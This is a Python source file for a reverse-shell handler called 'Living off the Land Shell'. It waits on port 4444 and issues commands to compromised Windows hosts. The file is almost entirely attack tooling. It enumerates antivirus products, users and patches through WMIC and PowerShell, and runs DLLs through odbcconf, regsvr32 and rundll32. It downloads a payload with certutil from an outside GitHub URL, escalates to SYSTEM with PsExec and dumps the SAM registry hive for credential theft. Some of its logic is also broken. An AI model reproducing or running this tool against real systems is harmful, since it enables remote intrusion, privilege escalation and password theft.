import base64
from socket import *
import os
import sys, select
import threading
from queue import Queue
#!/usr/bin/python
# import python modules
connectionlist = []
Number_Of__Threads = 2
Job_Number = [1, 2]
clearscreen = lambda: os.system('cls')
cwd = os.getcwd()
chdir = lambda: os.chdir()
Queue = Queue()
SAMpath = r'reg save HKEY_LOCAL_MACHINE\SAM\SAM C:\\Users\\amar\\desktop\\samcmd.reg'
desktoppath = 'C:\\Users\\amar\\desktop\\'



print ( 
    "\n\n\n"

         """     
         _      _       _                        __  __     _   _              _                     _ 
        | |    (_)     (_)                      / _|/ _|   | | | |            | |                   | |
        | |     ___   ___ _ __   __ _      ___ | |_| |_    | |_| |__   ___    | |     __ _ _ __   __| |
        | |    | \ \ / / | '_ \ / _` |    / _ \|  _|  _|   | __| '_ \ / _ \   | |    / _` | '_ \ / _` |
        | |____| |\ V /| | | | | (_| |   | (_) | | | |     | |_| | | |  __/   | |___| (_| | | | | (_| |
        |______|_| \_/ |_|_| |_|\__, |    \___/|_| |_|      \__|_| |_|\___|   |______\__,_|_| |_|\__,_|
                                 __/ |                                                                 
                                |___/             
                   .  .    .  .    .  .    .  .    .  .    .  .    .  .    .  .    ..S8S88 @t.
                .       .       .       .       .       .       .       .       . . .t88S888S. 
                   .  .    .  .    .  .    .  .    .  .    .  .    .  .    .  . . . .SX8S@S8X.. 
                .    .  .    .  .    .  .    .  .    .  .    .  .    .  .    .  ..SSt88 88..  
                  .       .       .       .       .       .       .       .   ...t8888 88  . .
                 .   . .    .  .    .  .    .  .    .  .    .  .    .  .    . . .%@S88 8@:. .  
                  .     .    .  .    .  .    .  .    .  .    .  .    .  .    . %88S8 8% .   . 
                .    .   .       .       .       .       .       .       .  . tS%88888 .. .   
                    .   .   .  .    .  .    .  .    .  .    .  .    .  .   .. %88@8888;      . 
                 .    .      .   .   .   .   .   .   .   .   .   .   .  . . .tX%88 88.  . .    
                   .     . .   .   .   .   .   .   .   .   .   .   .     . .;8888 8@  .     .  
                .   .           .       .       .       .       .    .  ..tX%88 8:.    . .    
                  .   . .  . .     . .     . .     . .     . .     .   . t888888X ..       .  
                 .         .    .       .       .       .       .     . .t8888S88;..  . .    . 
                    . .  .    .   . .     . .     . .     . .     . .  .8XX88888t...      .    
                 .          .         . .     . .     . .     . .    . %%tXX%88t     .  .   .  
                   .  . . .    . .  .     .       .       .       .   t88S 8%8;. .    .   .    
                 .           .        .     . .     . .     . . .  . .SX;; .;. .  . .       .  
                   . .  .  .    . . .   .  .    .  .    .  .  ;; . . .SXt.;:.   .      . .   . 
                  .       .   .           .    .   .   .   .  ;XXt. ..X.;8S:.  .  .  .      .   
                     . .        .  .  . .    .   .       .  .;XSSSS;.8 :t.         .   .  .     
                  .      . . .    .        .        . .     ;XSXSSXS8..t ..... . .   .       .  
                   .  .       .    .  .  .   . . .     . .:SXSSXS8S: tX8St;;..    .   . . .    
                  .      .  .    .      .   .        .  . ;SSSXSS8;: %t%;;:;.t: .            .  
                    . .       .    . .         .  .      :XXSXSXSS  ;XSttt;t:X .  .  .  .  .    
                  .     .  .    .      .  .  .      . . :SXSSXSXS8::;t%%t%t:@ .       .       . 
                     .    .  .    .  .   .     . .   . ;SXSXSSXS@@SXSSS%St;S .. .  .     .  .   
                 .    .       .       .   . .     .   %XSSSXSSS@XXXXSSSS:@ .        .          
                   .    . .    .  . .   .    . ..   .:XSXSXSXX8@@@XXXXX;8 .    .  .   .  .  .  
                 .   .      .    .    . ....:. .:..  %SXSSX%@88888@@@XtX.   .           .      
                   .   .  .   .     .:....    ; 8%8888@SSXXX8888888@8:8 .     . .  . .    .  . 
                 .          .   . ..tX8:%%X%;:888X8@S;XSSSS88888X%X8t@:.. .. .  ..    .        
                    . . . .   ..S:;.@@S8@8S8@888@X8;8S;;%S%St;:;S8X88@8@8X88tSSt%X;..   .  .   
                  .         ....t 88888S8888@888888888t@X@ .%8S%@S;X%8S888888888@8@@8 .. .   .  
                    .  . ...X %88S888X88X88@;88888888X@%8888@S8888SS:88888S8S88888888X;%...     
                 ....... %%XS8X88888:8888@88@8@888X88888S88@88888888888888@8888888888@8S8 .. . .
                
                
                                                              
                        ╔══════════════════════════════════════════════════════════╗
                        ║                LIVING OFF THE LAND  SHELL                ║  
                        ╠══════════════════════════════════════════════════════════╬
                        ║ THIS SHELL IS TO DEMONSTRATE LIVING OFF THE LAND ATTACKS ║
                        ║ WAIT FOR A CONNECTION. ONCE RECIEVED, TYPE LIST TO SHOW  ║ 
                        ║ CONNECTIONS. TYPE SELECT 0 TO CONNECT TO NUMBER 0.       ║
                        ║ ONCE CONNECTED TO A SHELL, TYPE INFO TO SHOW COMMANDS    ║  
                        ╚══════════════════════════════════════════════════════════╝

                               


													  """)

def PowershellInfo():
    print (""" \n
	╔═════════╦══════════════════════════════════╗
        ║ COMMAND ║           DESCRIPTION            ║
        ╠═════════╬══════════════════════════════════╣
        ║ LIST AV ║ SHOW INSTALLED SECURITY PRODUCTS ║
        ║ WMIC    ║ USE THE WMIC SHELL               ║
        ║ CMD     ║ USE THE CMD SHELL                ║
        ╚═════════╩══════════════════════════════════╝ \n """)
    PowershellInteract()

def WMICInfo():
    print ("""
	╔═════════════════════════════╦═════════════════════════════════╗
        ║           COMMAND           ║           DESCRIPTION           ║ 
        ╠═════════════════════════════╬═════════════════════════════════║
        ║ EXIT/QUIT                   ║ EXIT THE REVERSE SHELL          ║ 
        ║ POWERSHELL   USE POWERSHELL ║                                 ║  
        ║ CMD                         ║ USE CMD                         ║  
        ║ LIST STARTUP                ║ LIST STARTUP APPLICATIONS       ║  
        ║ LIST PROCESSES              ║ LIST ALL CURRENT PROCESSES      ║  
        ║ LIST USERS                  ║ LIST ALL USERS                  ║  
        ║ LIST DRIVES                 ║ LIST ALL DRIVES ON THE SYSTEM   ║  
        ║ LIST PATCHES                ║ LIST ALL PATCHES ON THE SYSTEM  ║  
        ║ LIST SYSTEM INFO            ║ LISTS ALL SYSTEM INFORMATION    ║  
        ╚═════════════════════════════╩═════════════════════════════════╝ \n """)

    WMIC()


def cmdinfo():
        print ("""
        ╔══════════════╦═════════════════════════════════════╗
        ║   COMMAND    ║            DESCRIPTION              ║  
        ╠══════════════╬═════════════════════════════════════╬
        ║ WMIC         ║   INTERACT WITH WMI                 ║  
        ║ POWERSHELL   ║   INTERACT WITH POWERSHELL          ║  
        ║ ODBLOAD      ║   LOAD DLL USING ODBCCONF.EXE       ║  
        ║ REGSVRLOAD   ║   LOAD DLL USING REGSVR32.EXE       ║ 
        ║ RUNDLL       ║   EXECUTE DLL USING RUNDLL32.EXE    ║
        ║ DOWNLOAD DLL ║   DOWNLOAD DLL USING CERTUTIL.EXE   ║
        ║ SAMDUMP      ║   DUMPS SAM REGISTRY TO .REG FILE   ║
        ║ GET SYSTEM   ║   PIPES COMMANDS THROUGH PSEXEC.EXE ║
        ╚══════════════╩═════════════════════════════════════╝

                                                                \n """)
        CMD()

#### CONNECTION LIST FOR HANDLER ####

def listconnections():
        results = ''
        for i, conn in enumerate(connectionlist):
               
                results += str(i) + '  ' + str(addr)
        print ('\n'+'----------------- CLIENTS -----------------' + '\n' + results + '\n')
        handler()

                


        




##### DISCOVERY COMMANDS VIA WMIC AND POWERSHELL ####

def GetAntivirus():
    while 1:
        print ('[+] Fetching Installed Security Products ....')
        antiviruscommand = bytes( 'powershell Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct ', 'utf-8')
        conn.send(antiviruscommand)
        dataAntivirus = conn.recv(65536).decode('utf-8')
        print(dataAntivirus)
        PowershellInteract()


def Startup():
    while 1:
        startupcommand = bytes('wmic startup get Caption,Command,Location,User /format:table ', 'utf-8')
        conn.send(startupcommand)
        datastartup = conn.recv(65536).decode('utf-8')
        print(datastartup)
        WMIC()

def ProcessList():
    while 1:
        Processcommand = bytes('wmic process get CSName,Description,ExecutablePath,ProcessId /format:table ', 'utf-8')
        conn.send(Processcommand)
        Processdata = conn.recv(65536).decode('utf-8')
        print(Processdata)
        WMIC()

def UserList():
    while 1:
        usercommand = bytes('wmic USERACCOUNT list full /format:table ', 'utf-8')
        conn.send(usercommand)
        userdata = conn.recv(65536).decode('utf-8')
        print(userdata)
        WMIC()

def DrivesList():
    while 1:
        drivescommand = bytes('wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:table ', 'utf-8')
        conn.send(drivescommand)
        drivedata = conn.recv(65536).decode('utf-8')
        print(drivedata)
        WMIC()

def PatchesList():
    while 1:
        patchescommand = bytes('wmic qfe get Caption,Description,HotFixID,InstalledOn /format:table ', 'utf-8')
        conn.send(patchescommand)
        patchesdata = conn.recv(65536).decode('utf-8')
        print(patchesdata)
        WMIC()

def TimeList():
    while 1:
        timecommand = bytes('wmic Timezone get DaylightName,Description,StandardName /format:table ', 'utf-8')
        conn.send(timecommand)
        timedata = conn.recv(65536).decode('utf-8')
        print(timedata)
        WMIC()

def SystemList():
    while 1:
        systemcommand = bytes('wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:table ', 'utf-8')
        conn.send(systemcommand)
        systemdata = conn.recv(65536).decode('utf-8')
        print(systemdata)
        WMIC()
		
#### CODE EXECUTION VIA WINDOWS BINARIES ###

def ODBCCONF():
        while 1:
	        odbcconfcommand = bytes('odbcconf.exe /s /a {REGSVR main.dll}', 'utf-8')
	        conn.send(odbcconfcommand)
	        CMD()

def regsvr32():
        while 1:
	        regcommand = bytes('regsvr32 /s /u main.dll', 'utf-8')
	        conn.send(regcommand)
	        CMD()

def rundll():
        while 1:
                rundllcommand = bytes('rundll32 main.dll,fireLazor', 'utf-8')
                conn.send(rundllcommand)
                CMD()

#### DOWNLOAD VIA WINDOWS BINARIES ###


def certutil():
        while 1:
                certutilcommand = bytes ('certutil.exe -urlcache -split -f "https://github.com/AmarSandhu96/Calculator/blob/master/main.dll" bad.dll')
                conn.send(certutilcommand)
                CMD()

### PRIVILEGE ESCALTION VIA MICROSOFT SIGNED BINARY ###

def getsystem():
        
    while 1:
        psexeccommand = input('[PSEXEC] | ' + ' >>> ')
        
        if psexeccommand == 'powershell': PowershellInteract()

        if psexeccommand == 'cmd': CMD()

        if psexeccommand == 'wmic': WMIC()

        inputlength1 = len(psexeccommand)
        if inputlength1 < 1:  getsystem()

        commandpsexec = bytes('Psexec.exe -s -i -d cmd /k ' + psexeccommand, 'utf-8')
        conn.send(commandpsexec)
        data1 = conn.recv(65536).decode('utf-8')
        print(data1)
        

### CREDENTIAL ACCESS VIA WINDOWS BINARY ###

def samdump():
        while 1:
                passcommand = bytes (SAMpath, 'utf-8')
                conn.send(passcommand)
                passdata = conn.recv(65536).decode('utf-8')
                print (passdata)
                print ('[+] File saved to {}'.format(desktoppath) + '\n')
                CMD()
                



                


#### ACCESS POWERSHELL PROMPT ####



def PowershellInteract():
    while 1:
        pscommand = input('[PS] | ' + ' >>> ')

        inputlength1 = len(pscommand)
        if inputlength1 < 1:  PowershellInteract()

        if pscommand == 'cls' or pscommand == 'clear': clearscreen(), PowershellInteract()

        if pscommand == 'handler': handler()

        if pscommand == 'info' or pscommand == 'INFO': PowershellInfo()

        if pscommand == 'cmd' or pscommand == 'CMD' :  CMD()

        if pscommand == 'wmic' or pscommand == 'WMIC':  WMIC()

        if pscommand == 'quit' or pscommand == 'QUIT' or pscommand == 'exit' or pscommand == 'EXIT' : exit(0)

        if pscommand == 'list AV': GetAntivirus()

        commandps = bytes('powershell ' + pscommand, 'utf-8')
        conn.send(commandps)
        data1 = conn.recv(65536).decode('utf-8')
        print(data1)

#### ACCESS WMIC PROMPT ####


def WMIC():
    while 1:
        wmiccommand = input('[WMIC] | ' + ' >>> ')
        inputlength1 = len(wmiccommand)
        if inputlength1 < 1: WMIC()

        if wmiccommand == 'handler': handler()

        if wmiccommand == 'cls' or wmiccommand == 'clear': clearscreen(), WMIC()

        if wmiccommand == 'info' or wmiccommand == 'INFO': WMICInfo()

        if wmiccommand == 'quit' or wmiccommand == 'QUIT' or wmiccommand == 'exit' or wmiccommand == 'EXIT' : exit(0)

        if wmiccommand == 'powershell' or wmiccommand == 'POWERSHELL': PowershellInteract()

        if wmiccommand == 'cmd' or wmiccommand == 'CMD' :  CMD()

        if wmiccommand == 'list startup': Startup()

        if wmiccommand == 'list processes': ProcessList()

        if wmiccommand == 'list users': UserList()

        if wmiccommand == 'list drives': DrivesList()

        if wmiccommand == 'list patches': PatchesList()

        if wmiccommand == 'list systeminfo': SystemList()

        wmiccommand1 = bytes('wmic ' + wmiccommand, 'utf-8')
        conn.send(wmiccommand1)
        data3 = conn.recv(65536).decode('utf-8')
        print(data3)

#### ACCESS CMD PROMPT ####

def CMD():
    
    while 1:
        
        command = input('[CMD] | ' + ' >>> ')
        
        inputlength = len(command)
        if inputlength < 1: CMD()

        if command == 'handler': handler()

        if command == "quit" or command == 'QUIT' or command == 'exit' or command == 'EXIT': 
                choice = input('\n' + '[!] THIS WILL CLOSE THE CONNECTION! ARE YOU SURE YOU WANT TO DO THIS? Y/N' + '\n' '> ')
                if choice == 'Y' or choice == 'y': 
                        connectionlist.remove(conn)
                        break

                if choice == 'N' or choice == 'n':
                        CMD()
                else:
                        print ('[!] Invalid Option')
                

        if command == "powershell" or command == 'POWERSHELL' or command == 'Powershell': PowershellInteract()

        if command == 'wmic' or command == 'WMIC': WMIC()

        if command == 'cls' or command == 'clear': clearscreen()
		
        if command == 'odbload': ODBCCONF()

        if command == 'regsvrload': regsvr32()

        if command == 'getsystem': getsystem()

        if command == 'rundll': rundll()

        if command == 'samdump': samdump()
        
        if command ==  'downloaddll': certutil()

        if command == 'info' or command == 'INFO': cmdinfo()    

        command1 = bytes(command, 'utf-8')
        
        conn.send(command1)
        
        data = conn.recv(65536).decode('utf-8')
        
        print(data)
        
    conn.close()

#### ATTEMPTED THREADING ####

def get_target(handlercommand):
        try:
                target = handlercommand.replace('select ', '')
                target = int(target)
                conn = connectionlist[target]
                print ('[+] Connected to ', conn)
                return conn
                
        except:
                print ('[+] Invalid Connection')
                handler()
                
def create_threads():
        for y in range(Number_Of__Threads):
                t = threading.Thread(target=work)
                t.daemon = True
                t.start()

def work():
        while True:
                x = Queue.get()
                if x == 1:
                        Main()
                if x == 2:
                        handler()
                Queue.task_done()

def create_jobs():
        for y in Job_Number:
                Queue.put(y)
        Queue.join()

#### HANDLER FUNCTION TO SELECT CONNECTIONS ####

def handler():
        while True:
                handlercommand = input('[HANDLER] >>> ')

                if len(handlercommand) < 1: handler()

                if handlercommand == 'List' or handlercommand == 'list': listconnections()

                if 'select' in handlercommand:
                        conn = get_target(handlercommand)
                        CMD()
                        if conn is None:
                                print ("[+] Connection Closed")
                               
                else:
                        print('[!] UNRECOGNIZED COMMAND')

                if handlercommand == "quit" or handlercommand == 'QUIT' or handlercommand == 'exit' or handlercommand == 'EXIT': break


#### MAIN FUNCTION FOR LISTENING TO CONNECTIONS ####


def Main():
        global HOST
        global PORT
        global s
        global conn
        global addr
        HOST = ''  # '' means bind to all interfaces
        PORT = 4444  #  port
        # create our socket handler
        s = socket(AF_INET, SOCK_STREAM)
        # set is so that when we cancel out we can reuse port
        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        # bind to interface
        s.bind((HOST, PORT))
        # print we are accepting connections
        print("Listening on 0.0.0.0:%s" % str(PORT))
        # listen for only 10 connection
        s.listen(10)
        # accept connections
        conn, addr = s.accept()
        # Add connection to List
        connectionlist.append(conn)
        # print connected by ipaddress
        print('[+] Connected by', addr)
        # receive initial connection
        data = conn.recv(65536)
        handler() # Go to handler function



if __name__ == "__main__": Main()






